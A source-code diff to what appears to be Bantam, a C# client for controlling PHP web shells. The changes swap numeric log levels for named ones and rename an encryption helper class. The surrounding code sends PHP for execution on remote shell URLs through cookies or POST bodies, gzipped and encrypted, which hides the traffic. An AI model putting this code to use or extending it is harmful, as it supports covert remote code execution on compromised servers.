@@ -140,9 +140,9 @@ namespace bantam.Classes
 
                 return responseString;
             } catch (System.Net.Http.HttpRequestException e) {
-                LogHelper.AddShellLog(url, "Exception caught while executing get request. [" + e.Message + "]", 1);
+                LogHelper.AddShellLog(url, "Exception caught while executing get request. [" + e.Message + "]", LogHelper.LOG_LEVEL.error);
             } catch (Exception e) {
-                LogHelper.AddShellLog(url, "Exception caught while executing get request. [" + e.Message + "]", 1);
+                LogHelper.AddShellLog(url, "Exception caught while executing get request. [" + e.Message + "]", LogHelper.LOG_LEVEL.error);
             }
             return string.Empty;
         }
@@ -168,9 +168,9 @@ namespace bantam.Classes
 
                 return responseString;
             } catch (System.Net.Http.HttpRequestException e) {
-                LogHelper.AddShellLog(url, "Exception caught while executing post request. [" + e.Message + "]", 1);
+                LogHelper.AddShellLog(url, "Exception caught while executing post request. [" + e.Message + "]", LogHelper.LOG_LEVEL.error);
             } catch (Exception e) {
-                LogHelper.AddShellLog(url, "Exception caught while executing post request. [" + e.Message + "]", 1);
+                LogHelper.AddShellLog(url, "Exception caught while executing post request. [" + e.Message + "]", LogHelper.LOG_LEVEL.error);
             }
             return string.Empty;
         }
@@ -203,7 +203,7 @@ namespace bantam.Classes
             string phpCode = phpCodeIn;
 
             if (string.IsNullOrEmpty(phpCode)) {
-                LogHelper.AddShellLog(url, "Attempted to execute empty/null code...", 2);
+                LogHelper.AddShellLog(url, "Attempted to execute empty/null code...", LogHelper.LOG_LEVEL.warning);
                 return new ResponseObject(string.Empty, string.Empty, string.Empty);
             }
 
@@ -233,7 +233,7 @@ namespace bantam.Classes
 
                 phpCode = Helper.MinifyCode(phpCode);
 
-                //todo cleanup / minimize and refactor this shit
+                //todo cleanup / minimize and refactor this shit and verify that it works without encryption/gzip
                 if (gzipRequestData) {
                     byte[] phpCodeBytes = Encoding.UTF8.GetBytes(phpCode);
                     phpCodeBytes = GzCompress(phpCodeBytes);
@@ -242,15 +242,15 @@ namespace bantam.Classes
                         string encryptionKey = BantamMain.Shells[url].RequestEncryptionKey;
 
                         if (sendRequestEncryptionIV) {
-                            requestEncryptionIV = EncryptionHelper.GetRandomEncryptionIV();
+                            requestEncryptionIV = CryptoHelper.GetRandomEncryptionIV();
                             requestEncryptionIV_VarName = BantamMain.Shells[url].RequestEncryptionIVRequestVarName;
 
-                            phpCode = EncryptionHelper.EncryptBytesToRJ256ToBase64(phpCodeBytes, encryptionKey, requestEncryptionIV);
+                            phpCode = CryptoHelper.EncryptBytesToRJ256ToBase64(phpCodeBytes, encryptionKey, requestEncryptionIV);
                             b64Encoded = true;
                         } else {
                             string encryptionIV = BantamMain.Shells[url].RequestEncryptionIV;
 
-                            phpCode = EncryptionHelper.EncryptBytesToRJ256ToBase64(phpCodeBytes, encryptionKey, encryptionIV);
+                            phpCode = CryptoHelper.EncryptBytesToRJ256ToBase64(phpCodeBytes, encryptionKey, encryptionIV);
                             b64Encoded = true;
                         }
                     } else {
@@ -262,15 +262,15 @@ namespace bantam.Classes
                         string encryptionKey = BantamMain.Shells[url].RequestEncryptionKey;
 
                         if (sendRequestEncryptionIV) {
-                            requestEncryptionIV = EncryptionHelper.GetRandomEncryptionIV();
+                            requestEncryptionIV = CryptoHelper.GetRandomEncryptionIV();
                             requestEncryptionIV_VarName = BantamMain.Shells[url].RequestEncryptionIVRequestVarName;
 
-                            phpCode = EncryptionHelper.EncryptBytesToRJ256ToBase64(Encoding.UTF8.GetBytes(phpCode), encryptionKey, requestEncryptionIV);
+                            phpCode = CryptoHelper.EncryptBytesToRJ256ToBase64(phpCode, encryptionKey, requestEncryptionIV);
                             b64Encoded = true;
                         } else {
                             string encryptionIV = BantamMain.Shells[url].RequestEncryptionIV;
 
-                            phpCode = EncryptionHelper.EncryptBytesToRJ256ToBase64(Encoding.UTF8.GetBytes(phpCode), encryptionKey, encryptionIV);
+                            phpCode = CryptoHelper.EncryptBytesToRJ256ToBase64(phpCode, encryptionKey, encryptionIV);
                             b64Encoded = true;
                         }
                     }
@@ -284,7 +284,7 @@ namespace bantam.Classes
 
                 if (sendViaCookie) {
                     if (phpCode.Length > Config.MaxCookieSizeB) {
-                        LogHelper.AddShellLog(url, "Attempted to execute request larger than Cookie Size Max...", 1);
+                        LogHelper.AddShellLog(url, "Attempted to execute request larger than Cookie Size Max...", LogHelper.LOG_LEVEL.error);
                         return new ResponseObject(string.Empty, string.Empty, string.Empty);
                     }
 
@@ -304,7 +304,7 @@ namespace bantam.Classes
 
                     int maxPostSizeBytes = (Config.MaxPostSizeKib * 1000);
                     if (postArgs.Length > maxPostSizeBytes) {
-                        LogHelper.AddShellLog(url, "Attempted to execute request larger than Post Size Max...", 1);
+                        LogHelper.AddShellLog(url, "Attempted to execute request larger than Post Size Max...", LogHelper.LOG_LEVEL.error);
                         return new ResponseObject(string.Empty, string.Empty, string.Empty);
                     }
 
@@ -319,9 +319,9 @@ namespace bantam.Classes
                     return new ResponseObject(responseString, ResponseEncryptionKey, ResponseEncryptionIV);
                 }
             } catch (System.Net.Http.HttpRequestException e) {
-                LogHelper.AddShellLog(url, "Exception caught while executing php. [" + e.Message + "]", 1);
+                LogHelper.AddShellLog(url, "Exception caught while executing php. [" + e.Message + "]", LogHelper.LOG_LEVEL.error);
             } catch (Exception e) {
-                LogHelper.AddShellLog(url, "Exception caught while executing php. [" + e.Message + "]", 1);
+                LogHelper.AddShellLog(url, "Exception caught while executing php. [" + e.Message + "]", LogHelper.LOG_LEVEL.error);
             }
             return new ResponseObject(string.Empty, string.Empty, string.Empty);
         }
